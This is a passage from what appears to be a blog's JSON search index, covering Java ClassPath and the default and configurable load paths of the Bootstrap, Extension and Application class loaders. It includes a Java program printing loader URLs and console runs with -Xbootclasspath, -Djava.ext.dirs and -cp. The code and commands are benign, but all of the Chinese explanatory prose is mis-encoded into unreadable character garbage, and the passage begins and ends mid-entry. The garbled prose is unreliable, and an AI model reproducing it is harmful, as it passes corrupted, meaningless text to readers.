·å°†.ä½œä¸ºç›®å½•åˆ†éš”ç¬¦ï¼Œè¿›å…¥ç›®å½•æŸ¥æ‰¾ç±»ï¼Œæ­¤æ—¶ä¹Ÿèƒ½æ‰¾åˆ°\nå¯ä»¥å°è¯•å°†MainTestClassPath.classæ‹¿å‡ºç›®å½•æ—¶ï¼Œä¸ç®¡æ€ä¹ˆæ‰§è¡Œéƒ½åŒæ ·ä¼šå¾—åˆ°é”™è¯¯: æ‰¾ä¸åˆ°æˆ–æ— æ³•åŠ è½½ä¸»ç±»çš„æƒ…å†µï¼Œæ‰€ä»¥é»˜è®¤çš„ClassLoaderçš„æŸ¥æ‰¾æ˜¯å’Œè·¯å¾„å¼ºç›¸å…³çš„ã€‚\nClassPath æ‰€ä»¥ClassPathæ˜¯ä»€ä¹ˆï¼Ÿ\nClassPathæ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œè¡¨ç¤ºJVMä»å“ªé‡Œå»å¯»æ‰¾è¦è¿è¡Œçš„classæ–‡ä»¶ï¼ŒClassPathä¼šåŒ…å«é»˜è®¤è·¯å¾„ä¸æ‰§è¡Œå‘½ä»¤çš„å½“å‰ç›®å½•\næ ¹æ®javacçš„ç”Ÿæˆå¯ä»¥å¾—çŸ¥ï¼Œpackageå…³é”®å­—ä¼šå°†åŒ…è·¯å¾„ä¸­çš„.å·ä½œä¸ºç›®å½•åˆ†éš”ç¬¦ã€‚è¿™æ ·å°±è§£é‡Šäº†ä¸ºä»€ä¹ˆIDEAä¸­ï¼Œæºç è·¯å¾„ä¹Ÿéœ€è¦ä¿æŒå’Œpackageå£°æ˜ä¿æŒä¸€è‡´çš„åŸå› ï¼Œä¸ºäº†å°½é‡å’Œç”Ÿæˆè·¯å¾„ä¸€è‡´\nIDEAæŠ¥é”™ IDEAæ­£å¸¸ æ€»ç»“ åœ¨è¿™ç¯‡æ–‡ç« ä¸­æåˆ°çš„ç±»åŠ è½½å™¨çš„åŠ è½½é˜¶æ®µï¼Œåº”ç”¨ç¨‹åºç±»åŠ è½½å™¨ - Application Class Loaderæ˜¯ä¼šæ ¹æ®ClassPathæ¥åŠ è½½ç±»ï¼ˆBootstrap Class Loader å’Œ Extension Class Loaderä¸ä¼šï¼‰ï¼Œæ‰€ä»¥åšæ­¤è¡¥å……ï¼Œå¹¶ä¸”ClassPathå¯ä»¥åšä¸ºå‚æ•°ä¼ é€’ç»™JVMï¼Œä½¿å…¶åŒ…å«é™¤é»˜è®¤ç›®å½•å¤–çš„å…¶ä»–ç›®å½•\næ‰€ä»¥å¦‚æœä½ åˆ°ç±»æ‰¾ä¸åˆ°äº†ï¼Œå¥½å¥½é…ç½®ä¸€ä¸‹ClassPathå§\nTips æˆ‘ä»¬å¼ºçƒˆä¸æ¨èåœ¨ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­è®¾ç½®classpathï¼Œé‚£æ ·ä¼šæ±¡æŸ“æ•´ä¸ªç³»ç»Ÿç¯å¢ƒã€‚åœ¨å¯åŠ¨JVMæ—¶è®¾ç½®classpathæ‰æ˜¯æ¨èçš„åšæ³•ã€‚å®é™…ä¸Šå°±æ˜¯ç»™javaå‘½ä»¤ä¼ å…¥-classpathå‚æ•°ï¼š\n1 java -classpath .;C:\\work\\project1\\bin;C:\\shared abc.xyz.Hello æˆ–è€…ä½¿ç”¨-cpçš„ç®€å†™ï¼š\n1 java -cp .;C:\\work\\project1\\bin;C:\\shared abc.xyz.Hello å‚è€ƒ https://liaoxuefeng.com/books/java/oop/basic/package/\nhttps://liaoxuefeng.com/books/java/oop/basic/classpath-jar/index.html\n","date":"2024-11-07T16:31:15+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241107144702889.png","permalink":"https://d4n-sec.github.io/p/javaclasspath/","title":"Java ClassPath"},{"content":"å‰æ–‡æœ‰æåˆ°Javaçš„é»˜è®¤ClassLoaderæœ‰ä¸‰ç§ï¼Œä¸”ä¸‰ç§çš„ClassLoaderä¼šåŠ è½½ä¸åŒçš„Javaç±»ã€‚\nä»–ä»¬åŠ è½½çš„ç±»çš„è·¯å¾„åœ¨å“ªï¼Ÿ\næ˜¯å¦å¯ä»¥è¿›è¡Œè®¾ç½®ï¼Ÿ\næœ¬æ–‡åšä¸€ä¸ªåˆæ­¥æ¢è®¨\nå…¨é‡è¾“å‡º åœ¨ä¸é…ç½®ä»»ä½•å‚æ•°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡ŒMainTest.javaæŸ¥çœ‹é»˜è®¤è·¯å¾„\nMainTest.javaå†…å®¹å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 import java.net.URL; import java.net.URLClassLoader; public class MainTest { public static void main(String[] args) { System.out.println(\u0026#34;BootstrapClassLoader LoadPath: \u0026#34;); URL[] urls = sun.misc.Launcher.getBootstrapClassPath().getURLs(); for(URL url : urls) System.out.println(url); // System.out.println(System.getProperty(\u0026#34;sun.boot.class.path\u0026#34;)); ä¹Ÿå¯ä»¥ System.out.println(\u0026#34;----------------------------\u0026#34;); //å–å¾—æ‰©å±•ç±»åŠ è½½å™¨ URLClassLoader extClassLoader = (URLClassLoader)ClassLoader.getSystemClassLoader().getParent(); System.out.println(extClassLoader); System.out.println(\u0026#34;ExtClassLoader LoadPath: \u0026#34;); urls = extClassLoader.getURLs(); for(URL url : urls) System.out.println(url); // System.out.println(System.getProperty(\u0026#34;java.ext.dirs\u0026#34;)); ä¹Ÿå¯ä»¥ System.out.println(\u0026#34;----------------------------\u0026#34;); //å–å¾—åº”ç”¨(ç³»ç»Ÿ)ç±»åŠ è½½å™¨ URLClassLoader appClassLoader = (URLClassLoader)ClassLoader.getSystemClassLoader(); System.out.println(appClassLoader); System.out.println(\u0026#34;AppClassLoader LoadPath: \u0026#34;); urls = appClassLoader.getURLs(); for(URL url : urls) System.out.println(url); // System.out.println(System.getProperty(\u0026#34;java.class.path\u0026#34;)); ä¹Ÿå¯ä»¥ System.out.println(\u0026#34;----------------------------\u0026#34;); } } ä½¿ç”¨æœ€åŸå§‹çš„æ–¹æ³•è¿è¡Œï¼Œç»“æœå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 cmd\u0026gt;javac.exe .\\MainTest.java # æœ‰ä¸€ä¸ªwarningï¼Œåˆ é™¤äº†ï¼Œä¸é‡è¦ï¼Œjdk version å¦‚ä¸‹ # java version \u0026#34;1.8.0_181\u0026#34; # Java(TM) SE Runtime Environment (build 1.8.0_181-b13) # Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode) # æ­¤æ—¶çš„ç›®å½•ç»“æ„ # ./ # â”œâ”€â”€ MainTest.class # â””â”€â”€ MainTest.java cmd\u0026gt;java.exe MainTest # å…¨é‡è¾“å‡ºå¦‚ä¸‹ BootstrapClassLoader LoadPath: file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/resources.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/rt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/sunrsasign.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jsse.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jce.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/charsets.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jfr.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/classes ---------------------------- sun.misc.Launcher$ExtClassLoader@15db9742 ExtClassLoader LoadPath: file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/access-bridge-64.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/cldrdata.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/dnsns.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/jaccess.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/jfxrt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/localedata.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/nashorn.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunec.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunjce_provider.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunmscapi.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunpkcs11.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/zipfs.jar ---------------------------- sun.misc.Launcher$AppClassLoader@73d16e93 AppClassLoader LoadPath: file:/C:/Users/Dan/Desktop/ppppppp/ ---------------------------- Class Loader Bootstrap Class Loaderï¼šåŠ è½½sun.boot.class.pathæ‰€æŒ‡å®šçš„è·¯å¾„æˆ–jar é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯ä»¥çœ‹åˆ°åŠ è½½çš„ç±»é›†ä¸­åœ¨jre\\libç›®å½•å’Œjre\\classesç›®å½•ä¸‹ã€‚\nExtension Class Loaderï¼šåŠ è½½java.ext.dirsæ‰€æŒ‡å®šçš„è·¯å¾„æˆ–jarã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯ä»¥çœ‹åˆ°åŠ è½½çš„ç±»é›†ä¸­åœ¨jre\\lib\\extç›®å½•ä¸‹ã€‚\nApplication Class LoaderåŠ è½½java.class.pathå¹¶ä¼šæœç´¢åº”ç”¨ç¨‹åºçš„ç±»è·¯å¾„ï¼ˆåŒ…æ‹¬ç”¨æˆ·å®šä¹‰çš„ç±»è·¯å¾„å’Œç³»ç»Ÿç±»è·¯å¾„ï¼‰ é»˜è®¤æƒ…å†µä¸‹ï¼Œæœ€ç®€å•çš„æƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°åŠ è½½çš„ç±»åªæœ‰javaå‘½ä»¤çš„æ‰§è¡Œç›®å½•ã€‚ä¹Ÿå°±æ˜¯ClassPathçš„é»˜è®¤è·¯å¾„ï¼Œç›¸å…³çŸ¥è¯†é“¾æ¥\nè¿›é˜¶ä¸€ç‚¹ å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªç±»åŠ è½½çš„é»˜è®¤è·¯å¾„è¿˜æ˜¯æŒºå•ä¸€çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦å¢åŠ ç±»åŠ è½½å™¨çš„åŠ è½½è·¯å¾„ï¼Œåº”è¯¥å¦‚ä½•åšå‘¢ï¼Ÿ\nbootclasspathï¼šå¯¹åº” Bootstrap CLassLoaderã€‚javaè™šæ‹Ÿæœºç³»ç»Ÿå‚æ•°sun.boot.class.pathã€‚ Extensions JAR filesï¼šå¯¹åº” Extention ClassLoader ã€‚javaè™šæ‹Ÿæœºç³»ç»Ÿå‚æ•°java.ext.dirsã€‚ classpathï¼šå¯¹åº” AppClassLoaderã€‚javaè™šæ‹Ÿæœºç³»ç»Ÿå‚æ•°java.class.pathã€‚\nBootstrap Class Loader å¦‚æœè¦ä¿®æ”¹æˆ–è€…å¢åŠ Bootstrap Class Loaderçš„åŠ è½½è·¯å¾„ï¼Œä¸‰ä¸ªå‚æ•°\n-Xbootclasspath: å®Œå…¨å–ä»£åŸºæœ¬æ ¸å¿ƒçš„Java class æœç´¢è·¯å¾„.ä¸å¸¸ç”¨ï¼ˆæ…ç”¨ï¼‰,å¦åˆ™è¦é‡æ–°å†™æ‰€æœ‰Javaæ ¸å¿ƒç±» -Xbootclasspath/a: åç¼€ã€‚åœ¨bootclasspathåé¢æ·»åŠ ã€‚å¸¸ç”¨ï¼ï¼ -Xbootclasspath/p: å‰ç¼€ã€‚åœ¨bootclasspathå‰é¢æ·»åŠ ã€‚ä¸å¸¸ç”¨ï¼Œé¿å…å¼•èµ·ä¸å¿…è¦çš„å†²çªã€‚ -Xbootclasspath/a ç¤ºä¾‹ çœç•¥æ— å…³éƒ¨åˆ†ï¼Œç»“æœå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 cmd\u0026gt;java.exe -Xbootclasspath/a:.\\lib\\ MainTest BootstrapClassLoader LoadPath: file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/resources.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/rt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/sunrsasign.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jsse.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jce.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/charsets.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jfr.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/classes file:/C:/Users/Dan/Desktop/ppppppp/lib å¯ä»¥çœ‹åˆ°æœ€åä¸€è¡Œæ·»åŠ äº†å½“å‰è·¯å¾„ä¸‹çš„libæ–‡ä»¶å¤¹\n-Xbootclasspath/p ç¤ºä¾‹ çœç•¥æ— å…³éƒ¨åˆ†ï¼Œç»“æœå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 cmd\u0026gt;java.exe -Xbootclasspath/p:.\\lib\\ MainTest BootstrapClassLoader LoadPath: file:/C:/Users/Dan/Desktop/ppppppp/lib file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/resources.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/rt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/sunrsasign.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jsse.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jce.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/charsets.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jfr.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/classes å¯ä»¥çœ‹åˆ°ç¬¬ä¸€è¡Œæ·»åŠ äº†å½“å‰è·¯å¾„ä¸‹çš„libæ–‡ä»¶å¤¹\nTips å¯ä»¥æ·»åŠ .classæ–‡ä»¶ç›®å½• å¯ä»¥æ·»åŠ .ymlã€.xmlã€.propertiesï¼ˆæˆ–å…¶å®ƒé…ç½®æ–‡ä»¶ï¼‰æ–‡ä»¶ç›®å½• å¯ä»¥æ·»åŠ .jaræ–‡ä»¶ ä¸å¯ä»¥æ·»åŠ .jaræ–‡ä»¶æ‰€åœ¨ç›®å½• Extension Class Loader java -Djava.ext.dirs=...å³å¯æ·»åŠ  -Djava.ext.dirs ç¤ºä¾‹ éœ€è¦ä½¿ç”¨System.out.println(System.getProperty(\u0026quot;java.ext.dirs\u0026quot;))æ¥è¾“å‡ºï¼Œè§‚å¯Ÿå˜åŒ–\n1 2 3 System.out.println(\u0026#34;ExtClassLoader LoadPath: \u0026#34;); System.out.println(System.getProperty(\u0026#34;java.ext.dirs\u0026#34;)); System.out.println(\u0026#34;----------------------------\u0026#34;); çœç•¥æ— å…³éƒ¨åˆ†ï¼Œç»“æœå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 cmd\u0026gt;java.exe MainTest # é»˜è®¤ç»“æœ C:\\Windows\\Sun\\Java\\lib\\ext ä¸å­˜åœ¨è¯¥ç›®å½• sun.misc.Launcher$ExtClassLoader@15db9742 ExtClassLoader LoadPath: D:\\Program Files\\Java\\jdk1.8.0_181\\jre\\lib\\ext;C:\\Windows\\Sun\\Java\\lib\\ext cmd\u0026gt;java.exe -Djava.ext.dirs=.\\test MainTest # è®¾ç½®åçš„ç»“æœï¼Œåªå‰©ä¸‹äº†è®¾ç½®ç›®å½• sun.misc.Launcher$ExtClassLoader@15db9742 ExtClassLoader LoadPath: .\\test cmd\u0026gt;java.exe -Djava.ext.dirs=\u0026#34;%JAVA_HOME%jre\\lib\\ext;.\\target\u0026#34; MainTest # æ¨èè®¾ç½®ç»“æœï¼ŒåŒ…å«äº†é»˜è®¤ç»“æœä¸­çš„é‡è¦éƒ¨åˆ†å’Œè‡ªå®šä¹‰éƒ¨åˆ† sun.misc.Launcher$ExtClassLoader@15db9742 ExtClassLoader LoadPath: D:\\Program Files\\Java\\jdk1.8.0_181\\jre\\lib\\ext;.\\target å¯¹æ —å­çš„è§£é‡Š\n-Djava.ext.dirs=\u0026quot;%JAVA_HOME%jre\\lib\\ext;.\\target\u0026quot;åŠ å¼•å·æ˜¯å› ä¸º%JAVA_HOME%åŒ…å«ç©ºæ ¼ã€‚ å°½é‡å°†javaè‡ªå¸¦çš„lib\\extç›®å½•å¸¦ä¸Šï¼Œå³%JAVA_HOME%jre\\lib\\extã€‚å¦åˆ™ï¼Œåœ¨ç”¨å…¶ä¸‹.jaræ—¶ï¼Œä¼šå‘ç”Ÿé”™è¯¯ã€‚å¦‚æœç¡®å®šä¸éœ€è¦å…¶ä¸‹.jaræ—¶ï¼Œåˆ™ä¸ç”¨åŠ ä¸Šjavaè‡ªå¸¦çš„lib\\extç›®å½•ã€‚ ç¼ºå°‘javaè‡ªå¸¦çš„lib\\extç›®å½•æ—¶ï¼Œjava.securityåŒ…ä¸èƒ½ä½¿ç”¨ï¼ˆNoSuchAlgorithmExceptionï¼‰ã€‚ Tips ä¸å¯ä»¥æ·»åŠ .classæ–‡ä»¶ç›®å½• ä¸å¯ä»¥æ·»åŠ .jaræ–‡ä»¶ å¯ä»¥æ·»åŠ .jaræ–‡ä»¶æ‰€åœ¨ç›®å½• æ¨èå°†javaè‡ªå¸¦çš„lib\\extç›®å½•å¸¦ä¸Š Application Class Loader java -classpath ... java -cp ... æ³¨ï¼šjava -cp ... æ˜¯ java -classpath ... çš„ç®€å†™\n-classpath ç¤ºä¾‹ çœç•¥æ— å…³éƒ¨åˆ†ï¼Œç»“æœå¦‚ä¸‹ åœ¨è¿™ç¯‡æ–‡ç« ä¸­ä¹Ÿæœ‰ç”¨åˆ°\n1 2 3 4 5 6 7 8 9 10 11 cmd\u0026gt;java.exe -cp .\\ttttest MainTest # å› ä¸º-cpå‚æ•°è¢«è¦†ç›–ï¼Œé»˜è®¤æœ‰å½“å‰è·¯å¾„ . ä½†æ˜¯è¦†ç›–ååªæœ‰ .\\ttttest ï¼Œä¸åœ¨å½“å‰è·¯å¾„å°±æ‰¾ä¸åˆ°å­—èŠ‚ç æ–‡ä»¶ï¼Œæ‰€ä»¥æŠ¥é”™ é”™è¯¯: æ‰¾ä¸åˆ°æˆ–æ— æ³•åŠ è½½ä¸»ç±» MainTest cmd\u0026gt;java.exe -cp .;.\\ttttest MainTest # å¤šä¸ªè·¯å¾„ä»¥;ç¬¦å·ä¸ºåˆ†éš”ï¼Œ.è¡¨ç¤ºå½“å‰è·¯å¾„ï¼Œæ·»åŠ åæŠ¥é”™è§£é™¤ sun.misc.Launcher$AppClassLoader@73d16e93 AppClassLoader LoadPath: file:/C:/Users/Dan/Desktop/ppppppp/ file:/C:/Users/Dan/Desktop/ppppppp/ttttest ---------------------------- å¯ä»¥çœ‹åˆ°æœ€åä¸€è¡Œæ·»åŠ äº†ttttestæ–‡ä»¶å¤¹\nå¦‚æœå‚æ•°ä¸º.\\ttttest;.åˆ™ç»“æœä¸º\n1 2 3 4 5 6 cmd\u0026gt;java.exe -cp .\\ttttest;. MainTest sun.misc.Launcher$AppClassLoader@73d16e93 AppClassLoader LoadPath: file:/C:/Users/Dan/Desktop/ppppppp/ttttest file:/C:/Users/Dan/Desktop/ppppppp/ ---------------------------- å¯ä»¥çœ‹åˆ°ç¬¬ä¸€è¡Œæ·»åŠ äº†ttttestæ–‡ä»¶å¤¹\nTips é¸¡ç²’æ¨èï¼ï¼åŠ å…¥å½“å‰æ–‡ä»¶è·¯å¾„\nå¯ä»¥æ·»åŠ .classæ–‡ä»¶ç›®å½•\nå¯ä»¥æ·»åŠ .jaræ–‡ä»¶\nä¸å¯ä»¥æ·»åŠ .jaræ–‡ä»¶æ‰€åœ¨ç›®å½•\nå¯ä»¥é€šé…ç¬¦* java -cp target\\* test.Test target\\*æ˜¯ä¸ªç‰¹ä¾‹ï¼Œå¯ä»¥è®©javaè‡ªåŠ¨æœç´¢å…¶ä¸‹çš„.jaræ–‡ä»¶ï¼Œå¹¶åŠ è½½ã€‚\nIDEA ç»“æœä¸€æ¢ å°†ä»£ç æ”¾å…¥IDEAè¿›è¡Œæ‰§è¡Œï¼Œä¼šå‘ç°ç»“æœä¸åŒ\nIDEAç»“æœå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 BootstrapClassLoader LoadPath: file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/resources.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/rt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/sunrsasign.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jsse.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jce.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/charsets.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jfr.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/classes ---------------------------- sun.misc.Launcher$ExtClassLoader@3eb07fd3 ExtClassLoader LoadPath: file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/access-bridge-64.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/cldrdata.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/dnsns.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/jaccess.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/jfxrt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/localedata.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/nashorn.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunec.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunjce_provider.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunmscapi.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunpkcs11.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/zipfs.jar ---------------------------- sun.misc.Launcher$AppClassLoader@18b4aac2 AppClassLoader LoadPath: file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/charsets.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/deploy.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/access-bridge-64.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/cldrdata.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/dnsns.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/jaccess.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/jfxrt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/localedata.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/nashorn.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunec.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunjce_provider.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunmscapi.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunpkcs11.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/zipfs.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/javaws.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jce.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jfr.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jfxswt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jsse.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/management-agent.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/plugin.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/resources.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/rt.jar file:/D:/Users/Dan/Code/Java/Empty/target/classes/ file:/C:/Users/Dan/.m2/repository/org/reflections/reflections/0.9.9/reflections-0.9.9.jar file:/C:/Users/Dan/.m2/repository/com/google/guava/guava/15.0/guava-15.0.jar file:/C:/Users/Dan/.m2/repository/com/google/code/findbugs/annotations/2.0.1/annotations-2.0.1.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api/2.2.6/shrinkwrap-resolver-api-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi/2.2.6/shrinkwrap-resolver-spi-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven/2.2.6/shrinkwrap-resolver-api-maven-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven/2.2.6/shrinkwrap-resolver-spi-maven-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven-archive/2.2.6/shrinkwrap-resolver-api-maven-archive-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/shrinkwrap-api/1.2.6/shrinkwrap-api-1.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven/2.2.6/shrinkwrap-resolver-impl-maven-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/aether/aether-api/1.0.0.v20140518/aether-api-1.0.0.v20140518.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/aether/aether-impl/1.0.0.v20140518/aether-impl-1.0.0.v20140518.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/aether/aether-spi/1.0.0.v20140518/aether-spi-1.0.0.v20140518.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/aether/aether-util/1.0.0.v20140518/aether-util-1.0.0.v20140518.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/aether/aether-connector-basic/1.0.0.v20140518/aether-connector-basic-1.0.0.v20140518.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/aether/aether-transport-wagon/1.0.0.v20140518/aether-transport-wagon-1.0.0.v20140518.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/maven-aether-provider/3.2.5/maven-aether-provider-3.2.5.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/maven-model/3.2.5/maven-model-3.2.5.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/maven-model-builder/3.2.5/maven-model-builder-3.2.5.jar file:/C:/Users/Dan/.m2/repository/org/codehaus/plexus/plexus-component-annotations/1.5.5/plexus-component-annotations-1.5.5.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/maven-repository-metadata/3.2.5/maven-repository-metadata-3.2.5.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/maven-settings/3.2.5/maven-settings-3.2.5.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/maven-settings-builder/3.2.5/maven-settings-builder-3.2.5.jar file:/C:/Users/Dan/.m2/repository/org/codehaus/plexus/plexus-interpolation/1.21/plexus-interpolation-1.21.jar file:/C:/Users/Dan/.m2/repository/org/codehaus/plexus/plexus-utils/3.0.20/plexus-utils-3.0.20.jar file:/C:/Users/Dan/.m2/repository/org/sonatype/plexus/plexus-sec-dispatcher/1.3/plexus-sec-dispatcher-1.3.jar file:/C:/Users/Dan/.m2/repository/org/sonatype/plexus/plexus-cipher/1.4/plexus-cipher-1.4.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/wagon/wagon-provider-api/2.6/wagon-provider-api-2.6.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/wagon/wagon-file/2.6/wagon-file-2.6.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/wagon/wagon-http-lightweight/2.6/wagon-http-lightweight-2.6.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/wagon/wagon-http-shared/2.6/wagon-http-shared-2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven-archive/2.2.6/shrinkwrap-resolver-impl-maven-archive-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/shrinkwrap-impl-base/1.2.6/shrinkwrap-impl-base-1.2.6.jar 